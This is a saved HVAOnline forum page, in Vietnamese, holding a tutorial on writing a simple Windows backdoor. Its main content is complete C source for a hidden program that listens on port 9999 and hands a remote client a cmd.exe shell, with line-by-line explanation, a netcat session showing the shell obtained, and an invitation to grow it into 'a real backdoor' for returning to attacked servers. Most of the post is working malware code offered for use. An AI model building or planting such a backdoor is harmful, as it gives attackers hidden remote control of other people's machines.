@@ -1,0 +1,170 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"> 
+
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
+<meta name="description" content="HVA Reading Room">
+<meta name="keywords" content=", reading room, hva, hvaonline, hvazone, hvaforum">
+<meta name="resource-type" content="document">
+<meta name="distribution" content="global">
+<meta name="robots" content="index,follow">
+<meta name="rating" content="general">
+<style type="text/css">
+<!-- 
+@import url( "http://www.hvaonline.net/hvaonline/templates/viet/styles/style.css");
+-->
+</style>
+<style type="text/css">
+<!--
+@import url("http://www.hvaonline.net/hvaonline/templates/viet/styles/en_US.css");
+-->
+</style>
+<title> - .:: HVAOnline ::.</title>
+
+</head>
+<body class="en_US">
+
+
+<!--
+Original theme from phpBB (http://www.phpbb.com) subSilver
+Created by subBlue design
+http://www.subBlue.com
+Modifications by JForum Team 
+Extended and customised by HVA Team
+Added more features and Black Silver theme designed by HVA
+-->
+<table width="100%" border="0" cols="2">
+	<tr align="right">
+		<td class="copyright">
+			English
+			| 
+			<a href="/hvaonline/jforum.hva?module=forums&amp;action=setLang&amp;lang=vi_VN" rel="nofollow">Vietnamese</a>
+		</td>
+	</tr>
+</table>
+<table width="100%" border="0" align="center">
+	<tr>
+        <td width="100%" align="center" valign="middle">
+			<a href="http://www.hvaonline.net" title="[Logo]"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/hvabanner-final.gif" alt="banner" /></a>
+		</td>
+	</tr>
+
+	<tr>
+		<td>
+<table cellspacing="0" cellpadding="0" width="80%" align="center" border="0">
+
+		<tr height="15">
+			<th colspan="2" class="thportal" align="left"><span class="readingheader">&nbsp;.::Exploit::.</span></th>
+		    <th class="thportal" align="center">
+				<span class="readingheader">
+					 Hướng dẫn viết một backdoor đơn giản trên Windows <a name="topPage" id="topPage"></a>
+				</span>
+			</th>
+		    <th class="thportal" align="right">
+				<a href="/hvaonline/posts/list/0/5516.hva#32372" target="_blank">
+				<img src="/hvaonline/templates/viet/images/goright.gif" align="absbottom" border="0" alt="Go to original post" title="Go to original post"/></a> 
+				<img src="/hvaonline/templates/viet/images/what.gif" align="absbottom" border="0" alt="Author: seamoun - Translator:  - Entry Date: 13/02/2009 07:59:28" title="Author: seamoun - Translator:  - Entry Date: 13/02/2009 07:59:28"/>
+			</th>
+		</tr>
+</table>
+
+<table cellspacing="0" cellpadding="5" width="80%" align="center" border="0">
+		<tr>
+		    <td align="left" colspan="2" class="readingborderBottom">
+				<table cellspacing="0" cellpadding="10" width="95%" align="center" border="0">
+					<tr>
+						<td align="left">
+							<div class="postbody">Nguyên tắc là cách làm việc của backdoor không giải thích các bạn cũng biết nó gì và cách sử dụng chúng như nào. Một khi backdoor được cài lên giúp kẻ tấn công sẽ thuận tiện hơn khi trở lại server mà mình đã tấn công vào, điều mà chúng ta cần biết là cách viết đổ cmd.exe tử backdoor (tức là kẻ tấn công có shell khi đã có backdoor được cài trên server) như thế nào ?<br/> <br/> Đoạn mã viết dưới đây không phải là backdoor mà chỉ đơn thuần là một phần công việc của backdoor. Sau đây mình sẽ hướng dẫn cách viết đổ cmd.exe như thế nào ?<br/> <br/> <span class="quotetxt"><b>Code:</b></span><br/><br/> 		<div class="coded""><br/> 		<pre>#include &lt;windows.h&gt;<br/> #include &lt;stdio.h&gt;<br/> #include &lt;string.h&gt;<br/> <br/> #define PORT 9999	//&lt;--Dat cong lang nghe la 9999<br/> #define BANNER	"Seamoun &#40;http://nhomvicki.net&#41; - TcpShell 1.0\n"<br/> #define	MAXRECVBUF	1000	//Bo dem toi da khi nhan<br/> #define MAXPIPEBUF	1000	//Bo dem toi da cua pipe<br/> #define WM_SHELL	WM_USER+1	//Tinh huong tu dinh nghia<br/> <br/> #define	MyClass	"Seamoun"	//Ten lop<br/> #define MyApp	"Seamoun"	//Ten ung dung<br/> <br/> #pragma comment&#40;lib,"wsock32.lib"&#41;	//Gop thu vien wsock32.lib<br/> <br/> <br/> HANDLE	hThread_out;	<br/> DWORD	dwChildThreadIdOut;<br/> SECURITY_ATTRIBUTES	sa;	<br/> STARTUPINFO	si;<br/> PROCESS_INFORMATION pi;<br/> HANDLE	hPipeOutputRead,hPipeOutputWrite,hPipeInputRead,hPipeInputWrite;<br/> BOOL	NowUsing;<br/> <br/> int	sock_listen,sock;<br/> sockaddr_in	addrServer;<br/> <br/> <br/> void GetShell &#40;HWND hwnd,WPARAM wParam,LPARAM lParam&#41;;<br/> int	WndProc&#40;HWND hwnd,UINT msg,WPARAM wParam,LPARAM lParam&#41;;<br/> DWORD	__stdcall OutSocket&#40;LPVOID lpData&#41;;<br/> <br/> int	__stdcall WinMain&#40;HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nShowCmd&#41;<br/> {<br/> 	HWND hwnd;<br/> 	MSG	 msg;<br/> <br/> 	WNDCLASSEX wc;<br/> 	wc.cbClsExtra=0;<br/> 	wc.cbSize=sizeof&#40;wc&#41;;<br/> 	wc.cbWndExtra=0;<br/> 	wc.hbrBackground=&#40;HBRUSH&#41;COLOR_WINDOW;<br/> 	wc.hCursor=LoadCursor&#40;NULL,IDC_ARROW&#41;;<br/> 	wc.hIcon=LoadIcon&#40;NULL,IDI_APPLICATION&#41;;<br/> 	wc.hIconSm=0;<br/> 	wc.hInstance=hInstance;<br/> 	wc.lpfnWndProc=&#40;WNDPROC&#41;WndProc;<br/> 	wc.lpszClassName=MyClass;<br/> 	wc.lpszMenuName=0;<br/> 	wc.style=CS_HREDRAW|CS_VREDRAW;<br/> <br/> 	RegisterClassEx&#40;&wc&#41;;<br/> 	hwnd=CreateWindowEx&#40;NULL,MyClass,MyApp,WS_OVERLAPPEDWINDOW,0,0,0,0,NULL,NULL,hInstance,NULL&#41;;<br/> 	ShowWindow&#40;hwnd,SW_HIDE&#41;;<br/> 	UpdateWindow&#40;hwnd&#41;;<br/> <br/> 	while &#40;GetMessage&#40;&msg,0,0,0&#41;&#41;<br/> 	{<br/> 		TranslateMessage&#40;&msg&#41;;<br/> 		DispatchMessage&#40;&msg&#41;;<br/> 	}<br/> <br/> 	return msg.wParam;<br/> }<br/> <br/> int	WndProc&#40;HWND hwnd,UINT msg,WPARAM wParam,LPARAM lParam&#41;<br/> {<br/> 	WSADATA	wsaData;<br/> 	switch&#40;msg&#41;<br/> 	{<br/> 	case WM_CREATE:<br/> 		if &#40;WSAStartup&#40;MAKEWORD&#40;1,1&#41;,&wsaData&#41;!=0&#41; return -1;<br/> 		if &#40;&#40;sock_listen=socket&#40;AF_INET,SOCK_STREAM,0&#41;&#41;==INVALID_SOCKET&#41; return -1;<br/> 		<br/> 		addrServer.sin_family=AF_INET;<br/> 		addrServer.sin_port=htons&#40;PORT&#41;;<br/> 		addrServer.sin_addr.s_addr=htonl&#40;INADDR_ANY&#41;;<br/> 		memset&#40;&addrServer.sin_zero,'\0',8&#41;;<br/> 		if &#40;bind&#40;sock_listen,&#40;struct sockaddr *&#41;&addrServer,sizeof&#40;addrServer&#41;&#41;==SOCKET_ERROR&#41; return -1;<br/> 		if &#40;listen&#40;sock_listen,1&#41;==SOCKET_ERROR&#41; return -1;<br/> 		if &#40;WSAAsyncSelect&#40;sock_listen,hwnd,WM_SHELL,<br/> 			FD_CLOSE|FD_ACCEPT|FD_READ|FD_WRITE&#41;==SOCKET_ERROR&#41; return -1;<br/> 		NowUsing=FALSE;<br/> 		break;<br/> 	case WM_CLOSE:<br/> 		PostQuitMessage&#40;wParam&#41;;<br/> 		break;<br/> 	case WM_SHELL:<br/> 		GetShell&#40;hwnd,wParam,lParam&#41;;<br/> 	default:<br/> 		return &#40;DefWindowProc&#40;hwnd,msg,wParam,lParam&#41;&#41;;<br/> 	}<br/> 	return 0;<br/> }<br/> void GetShell &#40;HWND hwnd,WPARAM wParam,LPARAM lParam&#41;<br/> {<br/> 	long lEvent=WSAGETSELECTEVENT&#40;lParam&#41;;<br/> 	static char buf&#91;MAXRECVBUF&#93;;<br/> 	DWORD	dwNumberOfBytesWrite;<br/> 	int	sock_tmp;<br/> 	UINT	r;<br/> 	sockaddr_in	addrClient;<br/> 	int	sizeClient=sizeof&#40;addrClient&#41;;<br/> 	if &#40;lEvent==FD_ACCEPT&#41;<br/> 	{<br/> 		if &#40;&#40;sock_tmp=accept&#40;sock_listen,&#40;struct sockaddr *&#41;&addrClient,&sizeClient&#41;&#41;==INVALID_SOCKET&#41; <br/> 			 if &#40;WSAGetLastError&#40;&#41;!=WSAEWOULDBLOCK&#41; return;<br/> 		<br/> 		if &#40;NowUsing==TRUE&#41;<br/> 		{<br/> 			closesocket&#40;sock_tmp&#41;;<br/> 			return;<br/> 		}<br/> 		sock=sock_tmp;<br/> 		send&#40;sock,BANNER,strlen&#40;BANNER&#41;,0&#41;;<br/> 		NowUsing=TRUE;<br/> <br/> 		sa.nLength=sizeof&#40;sa&#41;;<br/> 		sa.lpSecurityDescriptor=0;<br/> 		sa.bInheritHandle=TRUE;<br/> <br/> 		CreatePipe&#40;&hPipeOutputRead,&hPipeOutputWrite,&sa,5000&#41;;<br/> 		CreatePipe&#40;&hPipeInputRead,&hPipeInputWrite,&sa,5000&#41;;<br/> <br/> 		memset&#40;&#40;void *&#41;&si,'\0',sizeof&#40;si&#41;&#41;;<br/> 		memset&#40;&#40;void *&#41;&pi,'\0',sizeof&#40;pi&#41;&#41;;<br/> <br/> 		si.cb=sizeof&#40;si&#41;;<br/> 		si.dwFlags=STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;<br/> 		si.wShowWindow=SW_HIDE;<br/> 		si.hStdInput=hPipeInputRead;<br/> 		si.hStdOutput=hPipeOutputWrite;<br/> 		si.hStdError=hPipeOutputWrite;<br/> <br/> 		CreateProcess&#40;NULL,TEXT&#40;"cmd.exe"&#41;,NULL,NULL,TRUE,0,NULL,TEXT&#40;"c:\\"&#41;,&si,&pi&#41;;<br/> <br/> 		CloseHandle&#40;hPipeInputRead&#41;;<br/> 		CloseHandle&#40;hPipeOutputWrite&#41;;<br/> <br/> 		hThread_out=CreateThread&#40;NULL,0,OutSocket,NULL,NULL,&dwChildThreadIdOut&#41;;<br/> 		return;<br/> 	}<br/> 	else if &#40;lEvent==FD_CLOSE&#41;<br/> 	{<br/> 		closesocket&#40;sock&#41;;<br/> 		TerminateProcess&#40;pi.hProcess,0&#41;;<br/> 		TerminateThread&#40;hThread_out,0&#41;;<br/> 		CloseHandle&#40;pi.hProcess&#41;;<br/> 		CloseHandle&#40;hPipeOutputRead&#41;;<br/> 		CloseHandle&#40;hPipeInputWrite&#41;;<br/> 		NowUsing=FALSE;<br/> 	}<br/> 	if &#40;&#40;r=recv&#40;sock,buf,MAXRECVBUF,0&#41;&#41;==SOCKET_ERROR&#41; return;<br/> 	buf&#91;r&#93;=0;<br/> 	WriteFile&#40;hPipeInputWrite,&buf,r,&dwNumberOfBytesWrite,NULL&#41;;<br/> }<br/> DWORD	__stdcall OutSocket&#40;LPVOID lpData&#41;<br/> {<br/> 	char szBuffer&#91;MAXPIPEBUF&#93;;<br/> 	DWORD	dwNumberOfBytesRead;<br/> 	for &#40;;;&#41;<br/> 	{<br/> 		if &#40;ReadFile&#40;hPipeOutputRead,&szBuffer,MAXPIPEBUF,&dwNumberOfBytesRead,NULL&#41;==FALSE&#41; continue;<br/> 		if &#40;dwNumberOfBytesRead&lt;=0&#41; continue;<br/> 		FlushFileBuffers&#40;hPipeOutputRead&#41;;<br/> 		szBuffer&#91;dwNumberOfBytesRead&#93;=0;<br/> 		send&#40;sock,szBuffer,dwNumberOfBytesRead,0&#41;;<br/> 	}<br/> 	return 0;<br/> }</pre><br/> 		</div><br/> <br/> Với đoan mã trên thì phần đăng kí và tạo ra window thì đơn giản, các bạn có thể tham khảo cách lập trình C trên Windows. Để khỏi dài dòng mình chỉ nói phần đổ cmd.exe như thế nào mà thôi !<br/> 1) Trong tình huống WM_CREATE (tức là khi đang tạo Windows) chúng ta có đoạn mã sau:<br/> 	<br/> 	<span class="quotetxt"><b>Code:</b></span><br/><br/> 		<div class="coded""><br/> 		<pre>if &#40;WSAStartup&#40;MAKEWORD&#40;1,1&#41;,&wsaData&#41;!=0&#41; return -1;//&lt;-- Khởi tạo thư viện winsocket<br/> 	if &#40;&#40;sock_listen=socket&#40;AF_INET,SOCK_STREAM,0&#41;&#41;==INVALID_SOCKET&#41; return -1; //&lt;--Tạo socket listen<br/> 	//Định nghĩa giá trị cho biến cấu trúc sockaddr_in addrServer<br/> 	addrServer.sin_family=AF_INET;	<br/> 	addrServer.sin_port=htons&#40;PORT&#41;;<br/> 	addrServer.sin_addr.s_addr=htonl&#40;INADDR_ANY&#41;;<br/> 	memset&#40;&addrServer.sin_zero,'\0',8&#41;;<br/> 	//--------------------------------------------------------------------<br/> 	if &#40;bind&#40;sock_listen,&#40;struct sockaddr *&#41;&addrServer,sizeof&#40;addrServer&#41;&#41;==SOCKET_ERROR&#41; return -1;//Bind socket listen<br/> 	if &#40;listen&#40;sock_listen,1&#41;==SOCKET_ERROR&#41; return -1;	//&lt;-- Đặt chế độ lắng nghe<br/> <br/> 	//Tạo những tình huống riêng &#40;ở đây mình lấy tên tình huống riêng là WM_SHELL các bạn có thể lấy tên khác tùy ý miễn là nó được định nghĩa WM_USER +x&#41;<br/> 	if &#40;WSAAsyncSelect&#40;sock_listen,hwnd,WM_SHELL,<br/> 		FD_CLOSE|FD_ACCEPT|FD_READ|FD_WRITE&#41;==SOCKET_ERROR&#41; return -1;<br/> <br/> 	NowUsing=FALSE;	//&lt;--Đây đơn giản là biến dùng để đánh dấu socket đang dùng hay là không dùng nữa</pre><br/> 		</div><br/> 2) Giải thích mã của hai hàm GetShell và OutSocket<br/> <span class="quotetxt"><b>Code:</b></span><br/><br/> 		<div class="coded""><br/> 		<pre>a&#41; Hàm GetShell &#40;HWND hwnd,WPARAM wParam,LPARAM lParam&#41;<br/> 	long lEvent=WSAGETSELECTEVENT&#40;lParam&#41;;	//&lt;--Lấy sự kiện<br/> 	static char buf&#91;MAXRECVBUF&#93;;	//Khai báo biến buf để<br/> 	DWORD	dwNumberOfBytesWrite;	//<br/> 	int	sock_tmp;	//&lt;--Khai báo một socket trung gian<br/> 	UINT	r;<br/> 	sockaddr_in	addrClient;<br/> 	int	sizeClient=sizeof&#40;addrClient&#41;;<br/> 	//Khi có kết nối đến từ máy client - Ở đây kết nối được chấp nhận và sử lý như sau<br/> 	if &#40;lEvent==FD_ACCEPT&#41;<br/> 	{<br/> 		if &#40;&#40;sock_tmp=accept&#40;sock_listen,&#40;struct sockaddr *&#41;&addrClient,&sizeClient&#41;&#41;==INVALID_SOCKET&#41; <br/> 			 if &#40;WSAGetLastError&#40;&#41;!=WSAEWOULDBLOCK&#41; return;<br/> <br/> 		//Nếu như đang sử dụng thì đóng socket này lại	<br/> 		if &#40;NowUsing==TRUE&#41;<br/> 		{<br/> 			closesocket&#40;sock_tmp&#41;;<br/> 			return;<br/> 		}<br/> 		<br/> 		sock=sock_tmp;<br/> 		send&#40;sock,BANNER,strlen&#40;BANNER&#41;,0&#41;;<br/> 		NowUsing=TRUE;<br/> <br/> 		sa.nLength=sizeof&#40;sa&#41;;<br/> 		sa.lpSecurityDescriptor=0;<br/> 		sa.bInheritHandle=TRUE;<br/> 		<br/> 		//Tạo hai ống dẫn dùng để đổ cmd.exe. Một ống dùng để nhận lệnh từ client gửi đến và một ống dùng để xuất kết quả trả về cho client<br/> <br/> 		CreatePipe&#40;&hPipeOutputRead,&hPipeOutputWrite,&sa,5000&#41;;<br/> 		CreatePipe&#40;&hPipeInputRead,&hPipeInputWrite,&sa,5000&#41;;<br/> <br/> 		memset&#40;&#40;void *&#41;&si,'\0',sizeof&#40;si&#41;&#41;;<br/> 		memset&#40;&#40;void *&#41;&pi,'\0',sizeof&#40;pi&#41;&#41;;<br/> 		//Khởi tạo một số thông số cho biến cấu trúc si &#40;Startup Information: thông tin khởi động&#41;<br/> 		si.cb=sizeof&#40;si&#41;;<br/> 		si.dwFlags=STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;<br/> 		si.wShowWindow=SW_HIDE;<br/> 		si.hStdInput=hPipeInputRead;<br/> 		si.hStdOutput=hPipeOutputWrite;<br/> 		si.hStdError=hPipeOutputWrite;<br/> <br/> //Tạo một tiến trình mới. Mà ở đây là chạy cmd.exe		CreateProcess&#40;NULL,TEXT&#40;"cmd.exe"&#41;,NULL,NULL,TRUE,0,NULL,TEXT&#40;"c:\\"&#41;,&si,&pi&#41;;<br/> <br/> 		CloseHandle&#40;hPipeInputRead&#41;;<br/> 		CloseHandle&#40;hPipeOutputWrite&#41;;<br/> 		//Tạo luồng trong tiến trình mới với mục đích là đọc ghi dữ liệu<br/> 		hThread_out=CreateThread&#40;NULL,0,OutSocket,NULL,NULL,&dwChildThreadIdOut&#41;;<br/> 		return;<br/> 	}<br/> 	else if &#40;lEvent==FD_CLOSE&#41;<br/> 	{<br/> 	//Đóng tất các các handle khi xuất hiện tình huống FD_CLOSE<br/> 		closesocket&#40;sock&#41;;<br/> 		TerminateProcess&#40;pi.hProcess,0&#41;;<br/> 		TerminateThread&#40;hThread_out,0&#41;;<br/> 		CloseHandle&#40;pi.hProcess&#41;;<br/> 		CloseHandle&#40;hPipeOutputRead&#41;;<br/> 		CloseHandle&#40;hPipeInputWrite&#41;;<br/> 		NowUsing=FALSE;<br/> 	}<br/> 	if &#40;&#40;r=recv&#40;sock,buf,MAXRECVBUF,0&#41;&#41;==SOCKET_ERROR&#41; return;<br/> 	buf&#91;r&#93;=0;<br/> 	//Nhận dữ liệu từ client và ghi đến CMD.EXE<br/> 	WriteFile&#40;hPipeInputWrite,&buf,r,&dwNumberOfBytesWrite,NULL&#41;;<br/> }</pre><br/> 		</div><br/> 3) Giải thích mã hàm OutSocket<br/> <span class="quotetxt"><b>Code:</b></span><br/><br/> 		<div class="coded""><br/> 		<pre>DWORD	__stdcall OutSocket&#40;LPVOID lpData&#41;<br/> {<br/> 	char szBuffer&#91;MAXPIPEBUF&#93;;<br/> 	DWORD	dwNumberOfBytesRead;<br/> 	//Tạo vòng lặp vô tận để nhận kết quả trả về từ CMD.EXE<br/> 	for &#40;;;&#41;<br/> 	{<br/> 		if &#40;ReadFile&#40;hPipeOutputRead,&szBuffer,MAXPIPEBUF,&dwNumberOfBytesRead,NULL&#41;==FALSE&#41; continue;<br/> 		if &#40;dwNumberOfBytesRead&lt;=0&#41; continue;<br/> 		FlushFileBuffers&#40;hPipeOutputRead&#41;;<br/> 		szBuffer&#91;dwNumberOfBytesRead&#93;=0;	//&lt;-- Thêm kí tự kết thúc chuỗi trong dữ liệu trả về<br/> 		//Hiển thị kết quả CMD.EXE trả về ra màn hình client<br/> 		send&#40;sock,szBuffer,dwNumberOfBytesRead,0&#41;;<br/> 	}<br/> 	return 0;<br/> }</pre><br/> 		</div><br/> <br/> Biên dịch đoạn mã trên và thực thi nó sẽ có kết quả như sau:<br/> tcpshell sẽ lắng nghe trên cổng 9999. Chúng ta kết nối đến cổng 9999 bằng netcat để xem tcpshell đổ cmd.exe như thế nào<br/> <br/> <span class="quotetxt"><b>Code:</b></span><br/><br/> 		<div class="coded""><br/> 		<pre>d:\&gt;nx -vv -n 10.0.0.1 9999<br/> &#40;UNKNOWN&#41; &#91;10.0.0.1&#93; 9999 &#40;?&#41; open<br/> Seamoun &#40;http://nhomvicki.net&#41; - TcpShell 1.0<br/> Microsoft Windows 2000 &#91;Version 5.00.2195&#93;<br/> &#40;C&#41; Copyright 1985-2000 Microsoft Corp.<br/> <br/> c:\&gt;	&lt;--- Vậy là đã có shell</pre><br/> 		</div><br/> <br/> Sau bài này các bạn có thể phát triển tiếp cho mã trên trở thành một con backdoor thực sự !<br/> <br/> Bài này mình viết lâu roài. Đã post lên HVA rồi mà hổng biết sao tìm hổng thấy bài này nên mình post lại  <img src="/hvaonline/images/smilies/5e3ee5fb831b15dfe0bb63a8d0c6a93e.gif" border="0" alt="smilie" align="absbottom"> </div>
+						</td>
+					</tr>
+
+					<tr>
+						<td align="left"><a href="http://digg.com/submit?phrase=2&url=http://www.hvaonline.net/hvaonline/readingRoom/item/32372.hva"><img src="/hvaonline/templates/viet/images/digg.gif" align="texttop" alt="[digg]" title="[digg]"></a>
+<a href="http://del.icio.us/post?url=http://www.hvaonline.net/hvaonline/readingRoom/item/32372.hva"><img src="/hvaonline/templates/viet/images/delicious.gif" align="texttop" alt="[delicious]" title="[delicious]"></a>
+<a href="http://www.google.com/bookmarks/mark?op=edit&output=popup&bkmk=http://www.hvaonline.net/hvaonline/readingRoom/item/32372.hva"><img src="/hvaonline/templates/viet/images/google.gif" align="texttop" alt="[google]" title="[google]"></a>
+<a href="http://bookmarks.yahoo.com/toolbar/savebm?opener=tb&u=http://www.hvaonline.net/hvaonline/readingRoom/item/32372.hva"><img src="/hvaonline/templates/viet/images/yahoo.gif" align="texttop" alt="[yahoo]" title="[yahoo]"></a>
+<a href="http://technorati.com/faves?add=http://www.hvaonline.net/hvaonline/readingRoom/item/32372.hva"><img src="/hvaonline/templates/viet/images/technorati.gif" align="texttop" alt="[technorati]" title="[technorati]"></a>
+<a href="http://reddit.com/submit?url=http://www.hvaonline.net/hvaonline/readingRoom/item/32372.hva"><img src="/hvaonline/templates/viet/images/reddit.gif" align="texttop" alt="[reddit]" title="[reddit]"></a>
+<a href="http://www.stumbleupon.com/submit?url=http://www.hvaonline.net/hvaonline/readingRoom/item/32372.hva"><img src="/hvaonline/templates/viet/images/stumbleupon.gif" align="texttop" alt="[stumbleupon]" title="[stumbleupon]"></a></td>
+					</tr>
+				</table>
+			</td>
+		</tr>
+
+
+
+		<tr>
+			<td align="left" valign="top">
+				<a href="#topPage"><img src="/hvaonline/templates/viet/images/goup.gif" align="absbottom" border="0" alt="Go to top" title="Go to top"></a>
+				<a href="/hvaonline/posts/list/0/5516.hva#32372" target="_blank"><img src="/hvaonline/templates/viet/images/goright.gif" border="0" align="absbottom" alt="Go to original post" title="Go to original post"></a> 
+				&nbsp;
+			</td>
+			<td align="right">	<table cellspacing="0" cellpadding="0" border="0">
+		<tr>			  
+			<td nowrap="nowrap">
+				<form action="" name="f" id="f" accept-charset="UTF-8">
+					<select onchange="if(this.options[this.selectedIndex].value > 0){ document.location = '/hvaonline/readingRoom/show/'+ this.options[this.selectedIndex].value +'.hva'; }" name="select">
+						<option value="0" selected="selected">Go to Category</option>	
+						<option value="0">------------------------</option>	
+								<option value="1">Defense</option>
+								<option value="2">Exploit</option>
+								<option value="3">Reverse Engineering</option>
+								<option value="4">*nix</option>
+								<option value="5">Windows</option>
+								<option value="6">Networking</option>
+								<option value="7">Others</option>
+					</select>
+				</form>
+			</td>
+		</tr>
+	</table>
+</td>
+		</tr>
+</table>
+<script type="text/javascript">
+		var ctlTop = false;
+		var ctlBt = false;
+
+		function activateControllerTop()
+		{
+			ctlTop = !ctlTop;
+			document.getElementById("controllerTop").style.display = (ctlTop ? "" : "none");
+			document.getElementById("controllerTop").style.display = (ctlTop ? "" : "none");
+			document.getElementById("controllerTop").style.display = (ctlTop ? "" : "none");
+
+			if (ctlTop) {
+				document.location = document.location + "#ctlTop";
+			}
+		}
+
+		function activateControllerBottom()
+		{
+			ctlBt = !ctlBt;
+			document.getElementById("controllerBottom").style.display = (ctlBt ? "" : "none");
+			document.getElementById("controllerBottom").style.display = (ctlBt ? "" : "none");
+			document.getElementById("controllerBottom").style.display = (ctlBt ? "" : "none");
+
+			if (ctlBt) {
+				document.location = document.location + "#ctlBt";
+			}
+		}
+</script>
+
+	<tr>	
+		<td align="center">
+		<br>
+					</td>
+	</tr>
+
+	<tr>
+		<td align="center">
+			<span class="copyright">Powered by JForum - Extended by <a href="MailTo:lienlac@hvaonline.net">HVAOnline</a><br>
+			&nbsp;hvaonline.net&nbsp; | &nbsp;hvaforum.net&nbsp; | &nbsp;hvazone.net&nbsp; | &nbsp;hvanews.net&nbsp; | &nbsp;vnhacker.org<br>
+			1999 - 2013 &copy;
+			v2012|0504|218|
+		  </span>
+	  </td>
+	</tr>
+<iframe src="/hvaonline/templates/ping_session.jsp" height="0" width="0" frameborder="0" scrolling="no"></iframe>
+</body>
+</html>
